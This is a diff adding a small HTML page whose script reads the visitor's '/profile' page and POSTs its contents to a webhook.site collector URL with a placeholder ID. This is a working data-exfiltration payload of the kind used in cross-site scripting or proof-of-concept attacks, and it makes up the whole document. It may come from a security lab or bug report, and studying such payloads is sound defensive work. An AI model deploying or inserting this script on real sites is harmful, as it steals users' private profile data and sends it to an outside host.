@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <script>
+      fetch('/profile')
+        .then(r => r.text())
+        .then(data => {
+          fetch('https://webhook.site/YOUR-ID', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: data
+          });
+        });
+    </script>
+  </body>
+</html>
